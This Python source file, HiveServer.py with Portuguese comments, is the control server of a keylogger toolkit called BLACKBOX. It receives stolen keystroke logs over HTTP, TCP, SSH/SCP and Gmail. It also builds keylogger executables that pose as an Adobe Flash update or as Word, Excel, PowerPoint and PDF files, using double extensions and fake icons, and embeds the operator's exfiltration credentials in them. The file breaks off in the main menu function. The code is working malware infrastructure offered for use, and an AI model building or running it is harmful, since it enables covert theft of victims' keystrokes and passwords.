#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# HiveServer.py - Servidor Central para BLACKBOX
# Author: Guilherme Alexander
# https://github.com/Guilherme-alexander

import os
import sys
import json
import datetime
import smtplib
import socket
import threading
import time
import random
import string
import shutil
import subprocess
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import getpass
import platform

# Cores para terminal (apenas Branco, Amarelo, Vermelho)
WHITE = '\033[97m'
YELLOW = '\033[93m'
RED = '\033[91m'
END = '\033[0m'
BOLD = '\033[1m'
DIM = '\033[2m'

# Configurações
CONFIG_FILE = 'hive_config.json'
LOG_DIR = 'hive_logs'
HOST = '0.0.0.0'
PORT = 5000

class HiveServer:
    """Servidor central para coleta de logs dos keyloggers"""
    
    def __init__(self):
        self.email = None
        self.epass = None
        self.server = None
        self.running = False
        self.server_url = None
        
        # Configurações SSH
        self.ssh_host = None
        self.ssh_user = None
        self.ssh_pass = None
        self.ssh_port = 22
        self.ssh_path = '/var/log/hive/'
        self.ssh_key_file = None  # Caminho para chave SSH
        
        # Configurações TCP
        self.tcp_host = None
        self.tcp_port = 9999
        self.tcp_server = None
        
        # Protocolos ativos
        self.active_protocols = []
        
        # Cria diretório de logs se não existir
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR)
            
        self.load_config()
        
    def load_config(self):
        """Carrega configurações do arquivo JSON"""
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    self.email = config.get('email')
                    self.epass = config.get('password')
                    self.server_url = config.get('server_url', f'http://{self.get_local_ip()}:{PORT}/log')
                    
                    # Carrega configurações SSH
                    ssh_config = config.get('ssh', {})
                    self.ssh_host = ssh_config.get('host')
                    self.ssh_user = ssh_config.get('user')
                    self.ssh_pass = ssh_config.get('password')
                    self.ssh_port = ssh_config.get('port', 22)
                    self.ssh_path = ssh_config.get('path', '/var/log/hive/')
                    self.ssh_key_file = ssh_config.get('key_file')
                    
                    # Carrega configurações TCP
                    tcp_config = config.get('tcp', {})
                    self.tcp_host = tcp_config.get('host')
                    self.tcp_port = tcp_config.get('port', 9999)
                    
                    # Carrega protocolos ativos
                    self.active_protocols = config.get('active_protocols', ['http'])
                    
                    print(f"{WHITE}[+] Configurações carregadas de {CONFIG_FILE}{END}")
                    return True
            except Exception as e:
                print(f"{RED}[-] Erro ao carregar configurações: {e}{END}")
                return False
        return False
    
    def save_config(self):
        """Salva configurações em arquivo JSON"""
        config = {
            'email': self.email,
            'password': self.epass,
            'server_url': self.server_url,
            'ssh': {
                'host': self.ssh_host,
                'user': self.ssh_user,
                'password': self.ssh_pass,
                'port': self.ssh_port,
                'path': self.ssh_path,
                'key_file': self.ssh_key_file
            },
            'tcp': {
                'host': self.tcp_host,
                'port': self.tcp_port
            },
            'active_protocols': self.active_protocols,
            'updated_at': datetime.datetime.now().isoformat()
        }
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            print(f"{WHITE}[+] Configurações salvas em {CONFIG_FILE}{END}")
            return True
        except Exception as e:
            print(f"{RED}[-] Erro ao salvar configurações: {e}{END}")
            return False
    
    def setup_protocols(self):
        """Configura os protocolos via input"""
        clear()
        print(f"""{WHITE}
╔════════════════════════════════════════════════════════════╗
║               {YELLOW}CONFIGURAÇÃO DOS PROTOCOLOS{WHITE}                  ║
╚════════════════════════════════════════════════════════════╝
{END}""")
        
        print(f"\n{YELLOW}[!] Configure os métodos de envio de logs{END}")
        print(f"{WHITE}[*] Você pode usar múltiplos protocolos simultaneamente{END}\n")
        
        # Seleção de protocolos
        print(f"{WHITE}╔════════════════════════════════════════════════════════════╗{END}")
        print(f"{WHITE}║           SELECIONE OS PROTOCOLOS ATIVOS                   ║{END}")
        print(f"{WHITE}╠════════════════════════════════════════════════════════════╣{END}")
        print(f"{WHITE}║  [{YELLOW}1{WHITE}] HTTP/HTTPS   (Servidor Web)                           ║{END}")
        print(f"{WHITE}║  [{YELLOW}2{WHITE}] SSH/SCP      (Envio para servidor remoto)             ║{END}")
        print(f"{WHITE}║  [{YELLOW}3{WHITE}] TCP Socket   (Conexão TCP pura)                       ║{END}")
        print(f"{WHITE}║  [{YELLOW}4{WHITE}] E-mail       (Gmail)                                  ║{END}")
        print(f"{WHITE}║  [{YELLOW}0{WHITE}] Continuar                                             ║{END}")
        print(f"{WHITE}╚════════════════════════════════════════════════════════════╝{END}")
        
        self.active_protocols = []
        
        while True:
            choice = input(f"\n{YELLOW} [+] PROTOCOLOS >> {END}").strip()
            
            if choice == '0':
                if not self.active_protocols:
                    print(f"{RED}[!] Selecione pelo menos um protocolo!{END}")
                    continue
                break
            elif choice == '1':
                if 'http' not in self.active_protocols:
                    self.active_protocols.append('http')
                    local_ip = self.get_local_ip()
                    default_url = f'http://{local_ip}:{PORT}/log'
                    server_url = input(f"{WHITE}🌐 URL do servidor (Enter para {default_url}): {END}").strip()
                    if not server_url:
                        server_url = default_url
                    self.server_url = server_url
                    print(f"{WHITE}[+] HTTP ativado: {self.server_url}{END}")
            elif choice == '2':
                if 'ssh' not in self.active_protocols:
                    self.active_protocols.append('ssh')
                    print(f"\n{YELLOW}[!] Configure as credenciais SSH{END}")
                    print(f"{DIM}[*] Use scp/ssh para transferência de arquivos{DIM}\n")
                    
                    self.ssh_host = input(f"{WHITE}🌐 Host SSH (ex: 192.168.1.100): {END}").strip()
                    self.ssh_user = input(f"{WHITE}👤 Usuário SSH: {END}").strip()
                    
                    # Pergunta se quer usar chave ou senha
                    use_key = input(f"{WHITE}🔑 Usar chave SSH? (s/N): {END}").strip().lower()
                    if use_key == 's':
                        self.ssh_key_file = input(f"{WHITE}📁 Caminho da chave privada (ex: ~/.ssh/id_rsa): {END}").strip()
                        self.ssh_pass = None
                    else:
                        self.ssh_pass = getpass.getpass(f"{WHITE}🔑 Senha SSH: {END}")
                        self.ssh_key_file = None
                    
                    ssh_port_input = input(f"{WHITE}🔌 Porta SSH (Enter para 22): {END}").strip()
                    if ssh_port_input:
                        self.ssh_port = int(ssh_port_input)
                    else:
                        self.ssh_port = 22
                    
                    ssh_path_input = input(f"{WHITE}📁 Caminho remoto (Enter para /var/log/hive/): {END}").strip()
                    if ssh_path_input:
                        self.ssh_path = ssh_path_input
                    else:
                        self.ssh_path = '/var/log/hive/'
                    
                    # Testa conexão SSH
                    print(f"\n{WHITE}[*] Testando conexão SSH...{END}")
                    if self.test_ssh_connection():
                        print(f"{WHITE}[+] SSH ativado: {self.ssh_user}@{self.ssh_host}:{self.ssh_port}{END}")
                    else:
                        print(f"{RED}[!] Falha na conexão SSH! Verifique as credenciais.{END}")
                        confirm = input(f"{WHITE}Deseja continuar mesmo assim? (s/N): {END}").strip().lower()
                        if confirm != 's':
                            self.active_protocols.remove('ssh')
                            print(f"{YELLOW}[!] SSH desativado.{END}")
            elif choice == '3':
                if 'tcp' not in self.active_protocols:
                    self.active_protocols.append('tcp')
                    self.tcp_host = self.get_local_ip()
                    tcp_port_input = input(f"{WHITE}🔌 Porta TCP (Enter para 9999): {END}").strip()
                    if tcp_port_input:
                        self.tcp_port = int(tcp_port_input)
                    else:
                        self.tcp_port = 9999
                    print(f"{WHITE}[+] TCP ativado: {self.tcp_host}:{self.tcp_port}{END}")
            elif choice == '4':
                if 'email' not in self.active_protocols:
                    self.active_protocols.append('email')
                    email = input(f"{YELLOW}📧 E-mail Gmail: {END}").strip()
                    epass = getpass.getpass(f"{YELLOW}🔑 Senha do Gmail: {END}")
                    self.email = email
                    self.epass = epass
                    print(f"{WHITE}[+] E-mail ativado: {self.email}{END}")
            else:
                print(f"{RED}[!] Opção inválida!{END}")
        
        # Salva configurações
        self.save_config()
        
        # Exibe resumo
        print(f"\n{WHITE}╔════════════════════════════════════════════════════════════╗{END}")
        print(f"{WHITE}║              {YELLOW} PROTOCOLOS ATIVOS {WHITE}                           ║{END}")
        print(f"{WHITE}╠════════════════════════════════════════════════════════════╣{END}")
        for proto in self.active_protocols:
            if proto == 'http':
                print(f"{WHITE}║  {YELLOW}▶{WHITE} HTTP: {self.server_url}{WHITE}                     ║{END}")
            elif proto == 'ssh':
                print(f"{WHITE}║  {YELLOW}▶{WHITE} SSH: {self.ssh_user}@{self.ssh_host}:{self.ssh_port}{WHITE}           ║{END}")
                print(f"{WHITE}║      {DIM}Pasta: {self.ssh_path}{DIM}{WHITE}                        ║{END}")
            elif proto == 'tcp':
                print(f"{WHITE}║  {YELLOW}▶{WHITE} TCP: {self.tcp_host}:{self.tcp_port}{WHITE}                                 ║{END}")
            elif proto == 'email':
                print(f"{WHITE}║  {YELLOW}▶{WHITE} E-mail: {self.email}{WHITE}                              ║{END}")
        print(f"{WHITE}╚════════════════════════════════════════════════════════════╝{END}")
        
        input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
    
    def test_ssh_connection(self):
        """Testa a conexão SSH usando subprocess"""
        try:
            if platform.system() == 'Windows':
                # No Windows, usa plink ou ssh do WSL/Git
                ssh_cmd = 'ssh'
            else:
                ssh_cmd = 'ssh'
            
            # Comando para testar conexão
            cmd = [ssh_cmd, '-p', str(self.ssh_port), '-o', 'ConnectTimeout=5', '-o', 'StrictHostKeyChecking=no']
            
            if self.ssh_key_file:
                cmd.extend(['-i', self.ssh_key_file])
            
            cmd.extend([f'{self.ssh_user}@{self.ssh_host}', 'echo "OK"'])
            
            result = subprocess.run(cmd, capture_output=True, timeout=10, text=True)
            return result.returncode == 0
            
        except Exception as e:
            print(f"{DIM}Teste SSH falhou: {e}{DIM}")
            return False
    
    def send_via_ssh(self, hostname, log_data):
        """Envia logs via SSH/SCP usando subprocess"""
        if not self.ssh_host or not self.ssh_user:
            print(f"{RED}[-] Credenciais SSH não configuradas!{END}")
            return False
            
        try:
            # Cria arquivo temporário
            temp_file = f"{LOG_DIR}/temp_{hostname}_{int(time.time())}.log"
            with open(temp_file, 'w', encoding='utf-8') as f:
                f.write(log_data)
            
            # Prepara comando SCP
            if platform.system() == 'Windows':
                # No Windows, usa scp do sistema (WSL, Git Bash, ou OpenSSH)
                scp_cmd = 'scp'
            else:
                scp_cmd = 'scp'
            
            # Cria diretório remoto
            if self.ssh_key_file:
                ssh_cmd = ['ssh', '-i', self.ssh_key_file, '-p', str(self.ssh_port)]
            else:
                ssh_cmd = ['ssh', '-p', str(self.ssh_port)]
            
            ssh_cmd.extend([f'{self.ssh_user}@{self.ssh_host}', f'mkdir -p {self.ssh_path}'])
            
            # Executa mkdir remoto
            subprocess.run(ssh_cmd, capture_output=True, timeout=10)
            
            # Prepara comando SCP
            scp_cmd_list = [scp_cmd, '-P', str(self.ssh_port)]
            
            if self.ssh_key_file:
                scp_cmd_list.extend(['-i', self.ssh_key_file])
            
            # Nome do arquivo remoto
            remote_filename = f"{hostname}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
            remote_path = f"{self.ssh_user}@{self.ssh_host}:{self.ssh_path}{remote_filename}"
            
            scp_cmd_list.extend([temp_file, remote_path])
            
            # Executa SCP
            result = subprocess.run(scp_cmd_list, capture_output=True, timeout=30)
            
            # Remove arquivo temporário
            if os.path.exists(temp_file):
                os.remove(temp_file)
            
            if result.returncode == 0:
                print(f"{WHITE}[+] SSH: Log enviado para {self.ssh_host}:{self.ssh_path}{remote_filename}{END}")
                return True
            else:
                print(f"{RED}[-] SSH: Erro no envio - {result.stderr}{END}")
                return False
                
        except Exception as e:
            print(f"{RED}[-] Erro no SSH: {e}{END}")
            return False
    
    def send_via_tcp(self, hostname, log_data):
        """Envia logs via TCP Socket"""
        if not self.tcp_host:
            print(f"{RED}[-] TCP não configurado!{END}")
            return False
            
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.tcp_host, self.tcp_port))
            
            # Formata a mensagem
            message = f"[{hostname}] {datetime.datetime.now().isoformat()}\n{log_data}\n{'-'*60}\n"
            sock.send(message.encode('utf-8'))
            sock.close()
            
            print(f"{WHITE}[+] TCP: Log enviado para {self.tcp_host}:{self.tcp_port}{END}")
            return True
            
        except Exception as e:
            print(f"{RED}[-] Erro no TCP: {e}{END}")
            return False
    
    def send_email(self, subject, message):
        """Envia e-mail com os logs"""
        if not self.email or not self.epass:
            print(f"{RED}[-] Credenciais de e-mail não configuradas!{END}")
            return False
            
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = subject
            
            msg.attach(MIMEText(message, 'plain'))
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.email, self.epass)
            server.send_message(msg)
            server.quit()
            
            print(f"{WHITE}[+] E-mail enviado: {subject}{END}")
            return True
            
        except Exception as e:
            print(f"{RED}[-] Erro ao enviar e-mail: {e}{END}")
            return False
    
    def process_log(self, data):
        """Processa e armazena os logs recebidos"""
        try:
            # Extrai dados
            client_ip = data.get('client_ip', 'unknown')
            hostname = data.get('hostname', 'unknown')
            log_data = data.get('data', '')
            timestamp = datetime.datetime.now().isoformat()
            
            # Cria nome do arquivo
            filename = os.path.join(LOG_DIR, f"{hostname}_{client_ip}.log")
            
            # Formata a entrada
            log_entry = f"[{timestamp}] (IP: {client_ip})\n{log_data}\n{'-'*60}\n\n"
            
            # Salva no arquivo local
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(log_entry)
            
            print(f"{WHITE}[+] Log salvo localmente de {hostname} ({client_ip}) - {len(log_data)} caracteres{END}")
            
            # Envia via protocolos configurados
            if 'email' in self.active_protocols and self.email:
                subject = f"🐝 Log: {hostname} - {timestamp[:10]}"
                message = f"Host: {hostname}\nIP: {client_ip}\nData: {timestamp}\n\n{log_data}"
                self.send_email(subject, message)
            
            if 'ssh' in self.active_protocols:
                self.send_via_ssh(hostname, log_entry)
            
            if 'tcp' in self.active_protocols:
                self.send_via_tcp(hostname, log_entry)
            
            return True
            
        except Exception as e:
            print(f"{RED}[-] Erro ao processar log: {e}{END}")
            return False
    
    def view_logs(self):
        """Exibe os logs armazenados"""
        clear()
        print(f"""{WHITE}
╔════════════════════════════════════════════════════════════╗
║                    VISUALIZAR LOGS                         ║
╚════════════════════════════════════════════════════════════╝
{END}""")
        
        log_files = [f for f in os.listdir(LOG_DIR) if f.endswith('.log')]
        
        if not log_files:
            print(f"{YELLOW}[!] Nenhum log encontrado.{END}")
            input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
            return
        
        print(f"{WHITE}Arquivos de log disponíveis:{END}\n")
        for i, file in enumerate(log_files, 1):
            size = os.path.getsize(os.path.join(LOG_DIR, file))
            print(f"  {YELLOW}[{i}]{END} {file} ({size} bytes)")
        
        choice = input(f"\n{WHITE}Selecione um arquivo (0 para voltar): {END}").strip()
        
        if choice == '0':
            return
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(log_files):
                filepath = os.path.join(LOG_DIR, log_files[idx])
                clear()
                print(f"{WHITE}╔════════════════════════════════════════════════════════════╗{END}")
                print(f"{WHITE}  Arquivo: {YELLOW}{log_files[idx]}{END}")
                print(f"{WHITE}╚════════════════════════════════════════════════════════════╝{END}\n")
                
                with open(filepath, 'r', encoding='utf-8') as f:
                    content = f.read()
                    lines = content.split('\n')
                    if len(lines) > 500:
                        print(f"{YELLOW}[!] Mostrando apenas as últimas 500 linhas{END}\n")
                        content = '\n'.join(lines[-500:])
                    print(content)
                
                input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
        except:
            print(f"{RED}[!] Opção inválida!{END}")
            time.sleep(1)
    
    def start_tcp_server(self):
        """Inicia o servidor TCP para receber logs"""
        def tcp_handler():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(('0.0.0.0', self.tcp_port))
                server.listen(5)
                print(f"{WHITE}[+] TCP Server ouvindo na porta {self.tcp_port}{END}")
                
                while self.running:
                    try:
                        client, addr = server.accept()
                        data = client.recv(4096).decode('utf-8')
                        if data:
                            log_data = {
                                'client_ip': addr[0],
                                'hostname': 'tcp_client',
                                'data': data
                            }
                            self.process_log(log_data)
                        client.close()
                    except:
                        pass
            except Exception as e:
                print(f"{RED}[-] Erro no TCP Server: {e}{END}")
        
        if 'tcp' in self.active_protocols:
            tcp_thread = threading.Thread(target=tcp_handler)
            tcp_thread.daemon = True
            tcp_thread.start()
    
    def start_server(self):
        """Inicia o servidor HTTP"""
        class LogHandler(BaseHTTPRequestHandler):
            server_instance = None
            
            def do_POST(self):
                """Recebe logs via POST"""
                if self.path == '/log':
                    try:
                        content_length = int(self.headers['Content-Length'])
                        post_data = self.rfile.read(content_length)
                        data = json.loads(post_data.decode('utf-8'))
                        
                        data['client_ip'] = self.client_address[0]
                        
                        if self.server_instance:
                            success = self.server_instance.process_log(data)
                            
                            if success:
                                self.send_response(200)
                                self.send_header('Content-Type', 'application/json')
                                self.end_headers()
                                self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
                            else:
                                self.send_response(500)
                                self.end_headers()
                        else:
                            self.send_response(500)
                            self.end_headers()
                            
                    except Exception as e:
                        print(f"{RED}[-] Erro na requisição: {e}{END}")
                        self.send_response(400)
                        self.end_headers()
            
            def do_GET(self):
                """Página de status"""
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html; charset=utf-8')
                    self.end_headers()
                    
                    protocols = ', '.join(self.server_instance.active_protocols if self.server_instance else [])
                    
                    html = f"""
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>🐝 HiveServer - BLACKBOX</title>
                        <style>
                            body {{ font-family: Arial; margin: 40px; background: #1a1a1a; color: #fff; }}
                            .container {{ max-width: 800px; margin: 0 auto; }}
                            .card {{ background: #2d2d2d; padding: 20px; border-radius: 10px; margin: 20px 0; }}
                            .status {{ color: #4CAF50; font-weight: bold; }}
                            .info {{ color: #ff9800; }}
                            h1 {{ color: #4CAF50; }}
                            .protocol {{ background: #3d3d3d; padding: 5px 10px; border-radius: 5px; margin: 2px; }}
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <h1>🐝 HiveServer - Status</h1>
                            <div class="card">
                                <p><span class="status">✅ Servidor Ativo</span></p>
                                <p><span class="info">📧 E-mail:</span> {self.server_instance.email if self.server_instance else 'Não configurado'}</p>
                                <p><span class="info">📁 Logs:</span> {LOG_DIR}/</p>
                                <p><span class="info">🔌 Protocolos:</span> {protocols}</p>
                                <p><span class="info">🔌 Endpoint:</span> POST /log</p>
                            </div>
                            <div class="card">
                                <h3>📊 Estatísticas</h3>
                                <p>Total de logs: {len([f for f in os.listdir(LOG_DIR) if f.endswith('.log')])}</p>
                                <p>Última atualização: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                            </div>
                        </div>
                    </body>
                    </html>
                    """
                    self.wfile.write(html.encode('utf-8'))
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def log_message(self, format, *args):
                pass
        
        LogHandler.server_instance = self
        
        try:
            # Inicia TCP Server se configurado
            self.start_tcp_server()
            
            # Inicia HTTP Server
            self.server = HTTPServer((HOST, PORT), LogHandler)
            self.running = True
            
            print(f"{WHITE}╔════════════════════════════════════════════════════════════╗{END}")
            print(f"{WHITE}║           {YELLOW}🐝 HIVE SERVER INICIADO COM SUCESSO{WHITE}              ║{END}")
            print(f"{WHITE}╚════════════════════════════════════════════════════════════╝{END}")
            
            if 'http' in self.active_protocols:
                print(f"\n{WHITE}[+] HTTP Server: {YELLOW}http://{self.get_local_ip()}:{PORT}{END}")
                print(f"{WHITE}[+] Endpoint: {YELLOW}POST http://{self.get_local_ip()}:{PORT}/log{END}")
            
            if 'tcp' in self.active_protocols:
                print(f"{WHITE}[+] TCP Server: {YELLOW}{self.get_local_ip()}:{self.tcp_port}{END}")
            
            if 'ssh' in self.active_protocols:
                print(f"{WHITE}[+] SSH: {YELLOW}{self.ssh_user}@{self.ssh_host}:{self.ssh_port}{END}")
                print(f"{WHITE}[+] SSH Path: {YELLOW}{self.ssh_path}{END}")
            
            if 'email' in self.active_protocols:
                print(f"{WHITE}[+] E-mail: {YELLOW}{self.email}{END}")
            
            print(f"\n{WHITE}[+] Pasta de logs: {YELLOW}{os.path.abspath(LOG_DIR)}{END}")
            print(f"{WHITE}[+] Pressione {YELLOW}CTRL+C{WHITE} para parar o servidor{END}\n")
            
            self.server.serve_forever()
            
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Desligando servidor...{END}")
            self.running = False
        except Exception as e:
            print(f"{RED}[-] Erro ao iniciar servidor: {e}{END}")
            input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
    
    def get_local_ip(self):
        """Obtém o IP local da máquina"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'
    
    def randomword(self, length=10):
        """Gera uma string aleatória"""
        return ''.join(random.choice(string.ascii_lowercase) for i in range(length))
    
    def build_keylogger(self):
        """Constrói o keylogger com PyInstaller"""
        clear()
        print(f"""{WHITE}
╔════════════════════════════════════════════════════════════╗
║              {YELLOW}GERADOR DE KEYLOGGER - HIVE{WHITE}                   ║
╚════════════════════════════════════════════════════════════╝
{END}""")
        
        # Verifica se há protocolos configurados
        if not self.active_protocols:
            print(f"{RED}[-] Nenhum protocolo configurado!{END}")
            print(f"{YELLOW}[!] Configure primeiro os protocolos (opção 2){END}")
            input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
            return
        
        # Verifica se o template existe
        template_path = 'Templates/Bee.py'
        if not os.path.exists(template_path):
            print(f"{RED}[-] Template não encontrado: {template_path}{END}")
            input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
            return
        
        print(f"\n{WHITE}[*] Usando template: {YELLOW}{template_path}{END}")
        print(f"{WHITE}[*] Protocolos ativos: {YELLOW}{', '.join(self.active_protocols)}{END}")
        
        confirm = input(f"\n{WHITE}Deseja continuar com estas configurações? (s/N): {END}").strip().lower()
        if confirm != 's':
            print(f"{YELLOW}[!] Geração cancelada.{END}")
            input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
            return
        
        # Lê o template
        with open(template_path, 'r', encoding='utf-8') as template:
            o = template.read()
        
        # Constrói o payload com as configurações
        payload = '#!/usr/bin/env python3\n'
        payload += '# -*- coding: utf-8 -*-\n'
        payload += '# Keylogger gerado pelo BLACKBOX HiveServer\n'
        payload += '# Author: Guilherme Alexander\n'
        payload += '# https://github.com/Guilherme-alexander\n\n'
        payload += '# ============================================================\n'
        payload += '# CONFIGURAÇÕES INJETADAS PELO HIVESERVER\n'
        payload += '# ============================================================\n'
        
        # Protocolos ativos
        payload += f'ACTIVE_PROTOCOLS = {json.dumps(self.active_protocols)}\n'
        
        # Configurações HTTP
        if 'http' in self.active_protocols and self.server_url:
            payload += f'SERVER_URL = "{self.server_url}"\n'
        
        # Configurações SSH
        if 'ssh' in self.active_protocols and self.ssh_host:
            payload += f'SSH_HOST = "{self.ssh_host}"\n'
            payload += f'SSH_USER = "{self.ssh_user}"\n'
            if self.ssh_pass:
                payload += f'SSH_PASS = "{self.ssh_pass}"\n'
            if self.ssh_key_file:
                payload += f'SSH_KEY_FILE = "{self.ssh_key_file}"\n'
            payload += f'SSH_PORT = {self.ssh_port}\n'
            payload += f'SSH_PATH = "{self.ssh_path}"\n'
        
        # Configurações TCP
        if 'tcp' in self.active_protocols:
            payload += f'TCP_HOST = "{self.tcp_host}"\n'
            payload += f'TCP_PORT = {self.tcp_port}\n'
        
        # Configurações E-mail
        if 'email' in self.active_protocols and self.email:
            payload += f'EEMAIL = "{self.email}"\n'
            payload += f'EPASS = "{self.epass}"\n'
        
        payload += '# ============================================================\n\n'
        payload += str(o)
        
        # Salva o arquivo temporário
        with open('k.py', 'w', encoding='utf-8') as f:
            f.write(payload)
        
        print(f"\n{WHITE}[*] Construindo keylogger...{END}")
        
        # Comando PyInstaller
        if sys.platform == 'win32':
            pyinstaller = 'pyinstaller'
        else:
            if os.path.exists('/root/.wine/drive_c/Python27/python.exe'):
                pyinstaller = '/root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py'
            else:
                pyinstaller = 'pyinstaller'
        
        # Menu de opções de build
        print(f"\n{WHITE}╔════════════════════════════════════════════════════════════╗{END}")
        print(f"{WHITE}║           SELECIONE O TIPO DE KEYLOGGER                    ║{END}")
        print(f"{WHITE}╠════════════════════════════════════════════════════════════╣{END}")
        print(f"{WHITE}║  [{YELLOW}1{WHITE}] Adobe Flash Update   (Ícone Flash)                    ║{END}")
        print(f"{WHITE}║  [{YELLOW}2{WHITE}] Fake Word docx      (Ícone Word)                      ║{END}")
        print(f"{WHITE}║  [{YELLOW}3{WHITE}] Fake Excel xlsx     (Ícone Excel)                     ║{END}")
        print(f"{WHITE}║  [{YELLOW}4{WHITE}] Fake Powerpoint pptx (Ícone PowerPoint)               ║{END}")
        print(f"{WHITE}║  [{YELLOW}5{WHITE}] Fake Acrobat pdf   (Ícone PDF)                        ║{END}")
        print(f"{WHITE}║  [{YELLOW}6{WHITE}] Blank Executable   (Sem ícone)                        ║{END}")
        print(f"{WHITE}╚════════════════════════════════════════════════════════════╝{END}")
        
        build_choice = input(f"\n{YELLOW} HIVE >> {END}").strip()
        
        # Configurações de build
        configs = {
            '1': {
                'version': 'Resource/adobe.template',
                'icon': 'Icons/flash.ico',
                'name': 'Bee_Flash_.exe',
                'manifest': '--manifest=Manifest/manifest.manifest',
                'desc': 'Adobe Flash Update'
            },
            '2': {
                'version': 'Resource/word.template',
                'icon': 'Icons/word.ico',
                'name': 'Bee_Word_.docx.exe',
                'manifest': '--manifest=Manifest/manifest.manifest',
                'desc': 'Fake Word docx'
            },
            '3': {
                'version': 'Resource/excel.template',
                'icon': 'Icons/excel.ico',
                'name': 'Bee_Excel_.xlsx.exe',
                'manifest': '--manifest=Manifest/manifest.manifest',
                'desc': 'Fake Excel xlsx'
            },
            '4': {
                'version': 'Resource/powerpoint.template',
                'icon': 'Icons/powerpoint.ico',
                'name': 'Bee_Power_.pptx.exe',
                'manifest': '--manifest=Manifest/manifest.manifest',
                'desc': 'Fake Powerpoint pptx'
            },
            '5': {
                'version': 'Resource/acrobat.template',
                'icon': 'Icons/acrobat.ico',
                'name': 'Bee_AcrobatPDF_.pdf.exe',
                'manifest': '--manifest=Manifest/manifest.manifest',
                'desc': 'Fake Acrobat pdf'
            },
            '6': {
                'version': None,
                'icon': None,
                'name': 'Bee.exe',
                'manifest': '--manifest=Manifest/manifest.manifest',
                'desc': 'Blank Executable'
            }
        }
        
        config = configs.get(build_choice)
        if not config:
            print(f"{RED}[!] Opção inválida!{END}")
            input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
            return
        
        # Remove pasta dist anterior
        if os.path.exists('dist'):
            shutil.rmtree('dist', ignore_errors=True)
        
        # Monta comando
        cmd = f'{pyinstaller} --noconsole'
        
        if config['manifest'] and os.path.exists('Manifest/manifest.manifest'):
            cmd += f' {config["manifest"]}'
        
        if config['version'] and os.path.exists(config['version']):
            cmd += f' --version-file={config["version"]}'
        
        if config['icon'] and os.path.exists(config['icon']):
            cmd += f' -i {config["icon"]}'
        
        cmd += ' -F k.py'
        
        print(f"\n{WHITE}[*] Executando: {cmd}{END}")
        os.system(cmd)
        
        # Limpeza
        for item in ['build', 'k.spec', 'k.py']:
            if os.path.exists(item):
                if os.path.isdir(item):
                    shutil.rmtree(item, ignore_errors=True)
                else:
                    try:
                        os.remove(item)
                    except:
                        pass
        
        # Renomeia o executável
        if os.path.exists('dist/k.exe'):
            os.rename('dist/k.exe', 'dist/' + config['name'])
            clear()
            print(f"""{WHITE}
╔════════════════════════════════════════════════════════════╗
║                    {YELLOW}✅ KEYLOGGER GERADO{WHITE}                     ║
╚════════════════════════════════════════════════════════════╝
  [+] Tipo: {YELLOW}{config['desc']}{WHITE}                      
  [+] Arquivo: {YELLOW}{config['name']}{WHITE}                   
  [+] Local: {YELLOW}dist/{config['name']}{WHITE}                
  [+] Protocolos: {YELLOW}{', '.join(self.active_protocols)}{WHITE}

{END}""")
            
            # Pergunta se quer testar
            test = input(f"\n{WHITE}Deseja testar o keylogger agora? (s/N): {END}").strip().lower()
            if test == 's':
                print(f"{WHITE}[*] Executando keylogger...{END}")
                os.system(f'dist/{config["name"]}')
        else:
            print(f"{RED}[-] Erro ao gerar keylogger!{END}")
        
        input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")

def clear():
    """Limpa a tela"""
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    """Exibe banner do HiveServer"""
    clear()
    print(f"""{WHITE}
    ╔════════════════════════════════════════════════════════════╗
    ║                      {YELLOW}🐝 HIVE SERVER{WHITE}                        ║
    ║                 {YELLOW}Servidor Central BLACKBOX{WHITE}                  ║
    ║            {YELLOW}https://github.com/Guilherme-alexander{WHITE}          ║
    ╚════════════════════════════════════════════════════════════╝
    ╔════════════════════════════════════════════════════════════╗
    ║  [{YELLOW}1{WHITE}] Iniciar Servidor                                      ║
    ║  [{YELLOW}2{WHITE}] Configurar Protocolos                                 ║
    ║  [{YELLOW}3{WHITE}] Gerar KeyLogger                                       ║
    ║  [{YELLOW}4{WHITE}] Visualizar Logs                                       ║
    ║  [{YELLOW}5{WHITE}] Limpar Logs                                           ║
    ║  [{YELLOW}0{WHITE}] Voltar ao BLACKBOX                                    ║
    ╚════════════════════════════════════════════════════════════╝
{END}""")

def menu():
    """Menu principal do HiveServer"""
    hive = HiveServer()
    
    while True:
        banner()
        
